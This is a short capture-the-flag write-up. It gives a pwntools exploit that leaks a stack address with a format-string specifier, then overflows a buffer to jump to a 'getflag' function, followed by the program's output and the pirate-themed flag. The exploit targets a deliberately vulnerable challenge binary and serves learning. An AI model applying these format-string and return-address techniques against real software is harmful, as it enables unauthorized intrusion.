# Proof of Concept

## TL;DR

```
def exploit():
    global io
    rop = ROP(exe)
    io = initialize()

    io.sendlineafter(b':', b'%12$p')
    io.recvuntil(b'0x')
    stack = int(io.recvline().strip().decode(), 16)
    io.sendlineafter(b':', cyclic(30) + p32(stack+4) + cyclic(28) + p64(elf.sym['getflag']) + p64(next(elf.search(b'bartholomew123\0'))))
    info(f'Stack: {hex(stack)}')

    io.interactive()

```

```
aaaabaaacaaadaaaeaaafaaagaaaha$\xd4\xe4\xffaaaabaaacaaadaaaeaaafaaagaaa\xe6\x9
nYe Landlubber! Get off me ship and be lost in the sea with them sirens! Walk the plank, NOW!
Here be yer BIG treasure, matey:
HCS{y3r_t00_g00d_4t_th1s_l4d_m4y_th3_n4vy_n3_3r_c4tch_ye}

may ye be the richest in ALL of Seven Seas!
```

### Flag:

> HCS{y3r_t00_g00d_4t_th1s_l4d_m4y_th3_n4vy_n3_3r_c4tch_ye}
